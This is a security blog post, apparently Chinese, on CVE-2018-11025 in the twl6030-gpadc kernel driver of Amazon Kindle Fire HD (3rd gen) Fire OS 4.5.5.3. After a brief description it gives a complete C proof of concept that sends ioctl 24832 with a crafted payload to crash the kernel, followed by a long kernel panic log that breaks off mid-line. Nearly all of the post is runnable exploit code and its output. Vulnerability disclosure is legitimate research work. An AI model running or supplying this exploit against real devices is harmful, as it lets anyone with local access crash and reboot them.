<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Tag: Amazon - ol4three</title><meta description="涉猎方向有渗透测试、安全研究、二进制安全、代码审计、Python、Java"><meta property="og:type" content="blog"><meta property="og:title" content="ol4three"><meta property="og:url" content="http://www.ol4three.com/"><meta property="og:site_name" content="ol4three"><meta property="og:description" content="涉猎方向有渗透测试、安全研究、二进制安全、代码审计、Python、Java"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://www.ol4three.com/img/og_image.png"><meta property="article:author" content="ol4three"><meta property="article:tag" content="渗透测试、安全研究、二进制安全、代码审计、Python、Java、C++"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://www.ol4three.com"},"headline":"ol4three","image":["http://www.ol4three.com/img/og_image.png"],"author":{"@type":"Person","name":"ol4three"},"description":"涉猎方向有渗透测试、安全研究、二进制安全、代码审计、Python、Java"}</script><link rel="icon" href="/img/logo.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><script data-ad-client="1" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" async></script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="ol4three" type="application/atom+xml">
</head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="ol4three" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/Security%20Incidents">Security Incidents</a><a class="navbar-item" href="/Vulnerabilities">Vulnerabilities</a><a class="navbar-item" href="/Read%20Team">Read Team</a><a class="navbar-item" href="/Stop%20learning">Stop learning</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/tags">Tags</a></li><li class="is-active"><a href="#" aria-current="page">Amazon</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2020-09-12T15:13:10.000Z" title="2020-09-12T15:13:10.000Z">2020-09-12</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-09-12T15:19:42.748Z" title="2020-09-12T15:19:42.748Z">2020-09-12</time></span><span class="level-item"><a class="link-muted" href="/categories/IOT/">IOT</a></span><span class="level-item">12 minutes read (About 1754 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11025%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">（CVE-2018-11025）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</a></h1><div class="content"><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3内核组件中的内核模块/omap/drivers/mfd/twl6030-gpadc.c允许攻击者通过设备/ dev / twl6030上的ioctl的参数注入特制的参数-gpadc命令<strong>24832</strong>并导致内核崩溃。</p>
<p>要探索此漏洞，必须打开设备文件/ dev / twl6030-gpadc，并使用命令<strong>24832</strong>和精心设计的有效负载作为第三个参数在此设备文件上调用ioctl系统调用。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>poc</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is poc of Kindle Fire HD 3rd</span></span><br><span class="line"><span class="comment"> * A bug in the ioctl interface of device file /dev/twl6030-gpadc causes </span></span><br><span class="line"><span class="comment"> * the system crash via IOCTL 24832. </span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This Poc should run with permission to do ioctl on /dev/twl6030-gpadc.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> *driver = <span class="string">&quot;/dev/twl6030-gpadc&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> command = <span class="number">24832</span>; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">twl6030_gpadc_user_parms</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> channel;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span> </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">twl6030_gpadc_user_parms</span> <span class="title">payload</span>;</span></span><br><span class="line">        payload.channel = <span class="number">0x9b2a9212</span>;</span><br><span class="line">        payload.status = <span class="number">0x0</span>;</span><br><span class="line">        payload.result = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">        fd = open(driver, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open %s, with errno %d\n&quot;</span>, driver, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 1 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Try ioctl device file &#x27;%s&#x27;, with command 0x%x and payload NULL\n&quot;</span>, driver, command);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;System will crash and reboot.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(ioctl(fd, command, &amp;payload) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Allocation of structs failed, %d\n&quot;</span>, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 2 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h2><blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line">[18460.321624] Unable to handle kernel paging request at virtual address 4b3f25fc</span><br><span class="line">[18460.330139] pgd &#x3D; ca210000</span><br><span class="line">[18460.333251] [4b3f25fc] *pgd&#x3D;00000000</span><br><span class="line">[18460.337768] Internal error: Oops: 5 [#1] PREEMPT SMP ARM</span><br><span class="line">[18460.343810] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)</span><br><span class="line">[18460.351440] CPU: 0    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)</span><br><span class="line">[18460.358825] PC is at twl6030_gpadc_ioctl+0x160&#x2F;0x180</span><br><span class="line">[18460.364379] LR is at twl6030_gpadc_conversion+0x5c&#x2F;0x484</span><br><span class="line">[18460.370452] pc : [&lt;c031b080&gt;]    lr : [&lt;c031a950&gt;]    psr: 60030013</span><br><span class="line">[18460.370452] sp : de94dd90  ip : 00000000  fp : de94df04</span><br><span class="line">[18460.383422] r10: 00000000  r9 : dcccf608  r8 : bea875ec</span><br><span class="line">[18460.389282] r7 : de94c000  r6 : 00000000  r5 : 00006100  r4 : bea875ec</span><br><span class="line">[18460.396697] r3 : fffffeb4  r2 : 4b3f2730  r1 : de94dee8  r0 : 00000001</span><br><span class="line">[18460.404113] Flags: nZCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user</span><br><span class="line">[18460.412048] Control: 10c5387d  Table: 8a21004a  DAC: 00000015</span><br><span class="line">[18460.418609] </span><br><span class="line">[18460.418609] PC: 0xc031b000:</span><br><span class="line">[18460.423583] b000  e24b101c e30f3eb4 e34f3fff e0822082 e0812102 e51220e4 e18120b3 e5973008</span><br><span class="line">[18460.434234] b020  e294200c 30d22003 33a03000 e3530000 0a000006 e3e0000c e24bd01c e89da8f0</span><br><span class="line">[18460.444885] b040  e24b0e17 e3a0100c ebfcf5c4 eafffff8 e1a00004 e24b1e17 e3a0200c ebfced7f</span><br><span class="line">[18460.455444] b060  e3500000 0afffff3 eafffff1 e51b2170 e24b101c e30f3eb4 e34f3fff e0812102</span><br><span class="line">[18460.465972] b080  e5122134 e18120b3 eaffffe3 03e0303c 150b016c 050b316c eaffffdf c0acabbc</span><br><span class="line">[18460.476623] b0a0  e1a0c00d e92dd800 e24cb004 e59030e0 e3530000 159000ec 03e00012 e89da800</span><br><span class="line">[18460.487182] b0c0  e1a0c00d e92dd800 e24cb004 e59000f0 e89da800 e1a0c00d e92dd800 e24cb004</span><br><span class="line">[18460.497863] b0e0  e5d020e9 e5d030e8 e1820003 e2000003 e89da800 e1a0c00d e92dd800 e24cb004</span><br><span class="line">[18460.508544] </span><br><span class="line">[18460.508544] LR: 0xc031a8d0:</span><br><span class="line">[18460.513519] a8d0  e89da878 e1a00004 ebffff20 e2000003 e3500002 13e0000a 03a00000 e89da878</span><br><span class="line">[18460.524078] a8f0  c09ba0c0 e1a0c00d e92ddff0 e24cb004 e24dd014 e2509000 0a000114 e59f5454</span><br><span class="line">[18460.534759] a910  e595008c e3500000 0a00010b e2800004 eb0e1ff0 e1d910b6 e3510001 9a00000a</span><br><span class="line">[18460.545318] a930  e595308c e3e06015 e59f142c e5930000 ebff4e6b e595a08c e28a0004 eb0e1f69</span><br><span class="line">[18460.555999] a950  e1a00006 e24bd028 e89daff0 e595a08c e3a03f52 e023a193 e5933038 e3530000</span><br><span class="line">[18460.566680] a970  13e0600f 1afffff3 e59a32c4 e0818101 e595c088 e3130010 e08c7008 1a000025</span><br><span class="line">[18460.577331] a990  e3510000 0a0000c4 e1d930b8 e3530001 0a0000d7 e1d940b6 e3540000 0a0000bc</span><br><span class="line">[18460.587890] a9b0  e3a0000e e3a01002 e3a02090 e5956088 ebfff8bc e3540001 0a0000d1 e1d920b6</span><br><span class="line">[18460.598571] </span><br><span class="line">[18460.598571] SP: 0xde94dd10:</span><br><span class="line">[18460.603546] dd10  00000000 0000000d de94dda0 10624dd3 de94dd4c c031b080 60030013 ffffffff</span><br><span class="line">[18460.614196] dd30  de94dd7c bea875ec de94df04 de94dd48 c06a5318 c0008370 00000001 de94dee8</span><br><span class="line">[18460.624877] dd50  4b3f2730 fffffeb4 bea875ec 00006100 00000000 de94c000 bea875ec dcccf608</span><br><span class="line">[18460.635528] dd70  00000000 de94df04 00000000 de94dd90 c031a950 c031b080 60030013 ffffffff</span><br><span class="line">[18460.646087] dd90  de94ddac 9b2a9212 00000000 00000000 00040000 0001f8fc 00000000 00000000</span><br><span class="line">[18460.656738] ddb0  c00795a0 00000001 de94ddd4 de94ddc8 c00795b4 c00792bc de94de0c de94ddd8</span><br><span class="line">[18460.667419] ddd0  c0070df8 c00795ac de94c000 00000001 00000004 dd32f8f4 60000013 00000001</span><br><span class="line">[18460.678100] ddf0  00000001 00000004 dd32f800 00000000 00000000 de94de10 c00723a0 c06a4818</span><br><span class="line">[18460.688629] </span><br><span class="line">[18460.688659] FP: 0xde94de84:</span><br><span class="line">[18460.693725] de84  de94de90 c0207454 c00bd920 0000001e c26fda80 de94ded4 de94dea8 c00723a0</span><br><span class="line">[18460.704284] dea4  000fffff 00000000 ffffffff 00000002 00000001 00000000 de94df14 00000000</span><br><span class="line">[18460.714935] dec4  00000001 dcccf608 cfa9bf00 de94defc de94dee0 c02089fc 00000000 00000000</span><br><span class="line">[18460.725616] dee4  00000000 00000000 d683fb40 00000004 d683fb40 de94df74 de94df08 c0136044</span><br><span class="line">[18460.736328] df04  c031af2c 00000000 00000000 00000000 00000001 00000000 dd188490 d8f925d8</span><br><span class="line">[18460.746856] df24  de94df0c de94c000 bea87618 bea875ec 00006100 d683fb40 00000004 de94c000</span><br><span class="line">[18460.757537] df44  00000000 de94df64 00000000 bea875ec 00006100 d683fb40 00000004 de94c000</span><br><span class="line">[18460.768096] df64  00000000 de94dfa4 de94df78 c01365e0 c0135fc4 00000000 00000000 00000400</span><br><span class="line">[18460.778625] </span><br><span class="line">[18460.778625] R1: 0xde94de68:</span><br><span class="line">[18460.783721] de68  c2572140 de94debc 00000001 00000028 000fffff 00000001 de94dedc de94de90</span><br><span class="line">[18460.794403] de88  c0207454 c00bd920 0000001e c26fda80 de94ded4 de94dea8 c00723a0 000fffff</span><br><span class="line">[18460.804962] dea8  00000000 ffffffff 00000002 00000001 00000000 de94df14 00000000 00000001</span><br><span class="line">[18460.815643] dec8  dcccf608 cfa9bf00 de94defc de94dee0 c02089fc 00000000 00000000 00000000</span><br><span class="line">[18460.826202] dee8  00000000 d683fb40 00000004 d683fb40 de94df74 de94df08 c0136044 c031af2c</span><br><span class="line">[18460.836730] df08  00000000 00000000 00000000 00000001 00000000 dd188490 d8f925d8 de94df0c</span><br><span class="line">[18460.847381] df28  de94c000 bea87618 bea875ec 00006100 d683fb40 00000004 de94c000 00000000</span><br><span class="line">[18460.858032] df48  de94df64 00000000 bea875ec 00006100 d683fb40 00000004 de94c000 00000000</span><br><span class="line">[18460.868713] </span><br><span class="line">[18460.868713] R3: 0xfffffe34:</span><br><span class="line">[18460.873687] fe34  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.884246] fe54  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.894805] fe74  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.905456] fe94  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.916137] feb4  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.926788] fed4  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.937347] fef4  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.948028] ff14  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.958709] </span><br><span class="line">[18460.958709] R7: 0xde94bf80:</span><br><span class="line">[18460.963684] bf80  de926680 c00635cc 00000013 de84190c de926680 c00635cc 00000013 00000000</span><br><span class="line">[18460.974365] bfa0  00000000 00000000 de94bff4 de94bfb8 c0068af4 c00635d8 00000000 00000000</span><br><span class="line">[18460.985015] bfc0  de926680 00000000 00000000 00000000 de94bfd0 de94bfd0 00000000 de84190c</span><br><span class="line">[18460.995574] bfe0  c0068a64 c004cd64 00000000 de94bff8 c004cd64 c0068a70 1d04e2fb 1dfbe204</span><br><span class="line">[18461.006225] c000  00000000 00000002 00000000 c2572140 c0a0e840 00000000 00000015 cf9fca80</span><br><span class="line">[18461.016906] c020  00000000 de94c000 c09ddc50 c2572140 c25717c0 c1617b40 de94da7c de94d9c8</span><br><span class="line">[18461.027587] c040  c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000</span><br><span class="line">[18461.038146] c060  00c5f4c0 5ebcc27f 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[18461.048828] </span><br><span class="line">[18461.048828] R9: 0xdcccf588:</span><br><span class="line">[18461.053802] f588  dcccf588 dcccf588 00000000 00000000 00000000 c06bc674 000200da c09dda58</span><br><span class="line">[18461.064483] f5a8  00000000 00000000 dcccf5b0 dcccf5b0 00000000 dcccf5bc dcccf5bc 00000000</span><br><span class="line">[18461.075134] f5c8  5ae3ed25 00000000 00000000 00000000 dcccf5e0 00000000 00000000 00000000</span><br><span class="line">[18461.085815] f5e8  00200000 00000000 00000000 dcccf5f4 dcccf5f4 dccb2440 dccb2440 00000000</span><br><span class="line">[18461.096343] f608  00052180 00000000 00000000 00000000 00000000 00000000 c06b9600 dd1a4800</span><br><span class="line">[18461.107025] f628  dcccf6e0 dccb0300 00000c45 00000001 00a0003b 5ae3ed25 2bc5ac58 5ae3ed25</span><br><span class="line">[18461.117675] f648  2bc5ac58 5ae3ed25 2bc5ac58 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[18461.128234] f668  00000000 00000000 00000000 00000000 00000001 00000000 00000000 dcccf684</span><br><span class="line">[18461.138885] Process twl6030_gpadc_i (pid: 12849, stack limit &#x3D; 0xde94c2f8)</span><br><span class="line">[18461.146697] Stack: (0xde94dd90 to 0xde94e000)</span><br><span class="line">[18461.151611] dd80:                                     de94ddac 9b2a9212 00000000 00000000</span><br><span class="line">[18461.160827] dda0: 00040000 0001f8fc 00000000 00000000 c00795a0 00000001 de94ddd4 de94ddc8</span><br><span class="line">[18461.170043] ddc0: c00795b4 c00792bc de94de0c de94ddd8 c0070df8 c00795ac de94c000 00000001</span><br><span class="line">[18461.179138] dde0: 00000004 dd32f8f4 60000013 00000001 00000001 00000004 dd32f800 00000000</span><br><span class="line">[18461.188354] de00: 00000000 de94de10 c00723a0 c06a4818 00000004 00000001 dd32e0d8 dd32f800</span><br><span class="line">[18461.197570] de20: dd32e000 0000000a de94c000 c26fda80 de94de54 de94de40 c02ba53c c0072360</span><br><span class="line">[18461.206787] de40: dd32f800 dd32e000 de94de74 de94de58 c02c3c88 c02ba518 dd32e000 00000002</span><br><span class="line">[18461.215881] de60: 00000002 dd32fbbc c2572140 de94debc 00000001 00000028 000fffff 00000001</span><br><span class="line">[18461.225097] de80: de94dedc de94de90 c0207454 c00bd920 0000001e c26fda80 de94ded4 de94dea8</span><br><span class="line">[18461.234313] dea0: c00723a0 000fffff 00000000 ffffffff 00000002 00000001 00000000 de94df14</span><br><span class="line">[18461.243408] dec0: 00000000 00000001 dcccf608 cfa9bf00 de94defc de94dee0 c02089fc 00000000</span><br><span class="line">[18461.252624] dee0: 00000000 00000000 00000000 d683fb40 00000004 d683fb40 de94df74 de94df08</span><br><span class="line">[18461.261840] df00: c0136044 c031af2c 00000000 00000000 00000000 00000001 00000000 dd188490</span><br><span class="line">[18461.271057] df20: d8f925d8 de94df0c de94c000 bea87618 bea875ec 00006100 d683fb40 00000004</span><br><span class="line">[18461.280151] df40: de94c000 00000000 de94df64 00000000 bea875ec 00006100 d683fb40 00000004</span><br><span class="line">[18461.289367] df60: de94c000 00000000 de94dfa4 de94df78 c01365e0 c0135fc4 00000000 00000000</span><br><span class="line">[18461.298583] df80: 00000400 bea87618 00010e5c 00000000 00000036 c0013e08 00000000 de94dfa8</span><br><span class="line">[18461.307800] dfa0: c0013c60 c0136578 bea87618 00010e5c 00000004 00006100 bea875ec bea875ec</span><br><span class="line">[18461.316894] dfc0: bea87618 00010e5c 00000000 00000036 00000000 00000000 00000000 bea87604</span><br><span class="line">[18461.326110] dfe0: 00000000 bea875d4 00010698 0002918c 60000010 00000004 00000000 00000000</span><br><span class="line">[18461.335296] Backtrace: </span><br><span class="line">[18461.338317] [&lt;c031af20&gt;] (twl6030_gpadc_ioctl+0x0&#x2F;0x180) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c&#x2F;0x5b4)</span><br><span class="line">[18461.348571]  r7:d683fb40 r6:00000004 r5:d683fb40 r4:00000000</span><br><span class="line">[18461.355560] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0&#x2F;0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74&#x2F;0x84)</span><br><span class="line">[18461.364807] [&lt;c013656c&gt;] (sys_ioctl+0x0&#x2F;0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[18461.374206]  r8:c0013e08 r7:00000036 r6:00000000 r5:00010e5c r4:bea87618</span><br><span class="line">[18461.382507] Code: e24b101c e30f3eb4 e34f3fff e0812102 (e5122134) </span><br><span class="line">[18461.401061] Board Information: </span><br><span class="line">[18461.401061]  Revision : 0001</span><br><span class="line">[18461.401092]  Serial	: 0000000000000000</span><br><span class="line">[18461.401092] SoC Information:</span><br><span class="line">[18461.401092]  CPU	: OMAP4470</span><br><span class="line">[18461.401122]  Rev	: ES1.0</span><br><span class="line">[18461.401122]  Type	: HS</span><br><span class="line">[18461.401122]  Production ID: 0002B975-000000CC</span><br><span class="line">[18461.401122]  Die ID	: 1CC60000-50002FFF-0B00935D-11007004</span><br><span class="line">[18461.401153] </span><br><span class="line">[18461.406127] audit_printk_skb: 111 callbacks suppressed</span><br><span class="line">[18461.406127] type&#x3D;1400 audit(1525657115.783:1097): avc:  denied  &#123; getattr &#125; for  pid&#x3D;12851 comm&#x3D;&quot;am&quot; path&#x3D;&quot;&#x2F;system&#x2F;bin&#x2F;app_process&quot; dev&#x3D;&quot;mmcblk0p9&quot; ino&#x3D;32006 scontext&#x3D;u:r:untrusted_app:s0 tcontext&#x3D;u:object_r:zygote_exec:s0 tclass&#x3D;file</span><br><span class="line">[18461.406280] type&#x3D;1400 audit(1525657115.783:1098): avc:  denied  &#123; execute &#125; for  pid&#x3D;12851 comm&#x3D;&quot;am&quot; name&#x3D;&quot;app_process&quot; dev&#x3D;&quot;mmcblk0p9&quot; ino&#x3D;32006 scontext&#x3D;u:r:untrusted_app:s0 tcontext&#x3D;u:object_r:zygote_exec:s0 tclass&#x3D;file</span><br><span class="line">[18461.406524] type&#x3D;1400 audit(1525657115.783:1099): avc:  denied  &#123; read open &#125; for  pid&#x3D;12851 comm&#x3D;&quot;am&quot; name&#x3D;&quot;app_process&quot; dev&#x3D;&quot;mmcblk0p9&quot; ino&#x3D;32006 scontext&#x3D;u:r:untrusted_app:s0 tcontext&#x3D;u:object_r:zygote_exec:s0 tclass&#x3D;file</span><br><span class="line">[18461.406768] type&#x3D;1400 audit(1525657115.783:1100): avc:  denied  &#123; execute_no_trans &#125; for  pid&#x3D;12851 comm&#x3D;&quot;am&quot; path&#x3D;&quot;&#x2F;system&#x2F;bin&#x2F;app_process&quot; dev&#x3D;&quot;mmcblk0p9&quot; ino&#x3D;32006 scontext&#x3D;u:r:untrusted_app:s0 tcontext&#x3D;u:object_r:zygote_exec:s0 tclass&#x3D;file</span><br><span class="line">[18461.534057] ---[ end trace f98f4a7b98572f61 ]---</span><br><span class="line">[18461.540374] Kernel panic - not syncing: Fatal 